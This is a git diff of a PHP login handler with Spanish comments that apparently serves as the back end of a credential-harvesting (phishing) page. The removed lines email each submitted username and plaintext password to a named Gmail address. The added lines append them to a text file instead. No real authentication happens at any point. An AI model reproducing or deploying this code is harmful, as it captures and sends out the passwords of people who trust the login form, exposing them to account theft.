@@ -3,12 +3,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $usuario = $_POST['usuario'];
     $contraseña = $_POST['contraseña'];
 
-    // Configuración del correo electrónico
-    $destinatario = 'wallaceytx@gmail.com';
-    $asunto = 'Inicio de sesión';
-    $mensaje = "Nombre de usuario: $usuario\nContraseña: $contraseña";
+    // Datos a guardar
+    $datos = "Nombre de usuario: $usuario\nContraseña: $contraseña\n";
 
-    // Envío del correo electrónico
-    $resultado = mail($destinatario, $asunto, $mensaje);
+    // Ruta al archivo de texto
+    $archivo = 'datos_usuarios.txt';
+
+    // Abre el archivo para escritura
+    $gestor = fopen($archivo, 'a');
+
+    // Escribe los datos en el archivo
+    fwrite($gestor, $datos);
+
+    // Cierra el archivo
+    fclose($gestor);
+
+    echo 'Los datos se han guardado correctamente.';
 }
 ?>
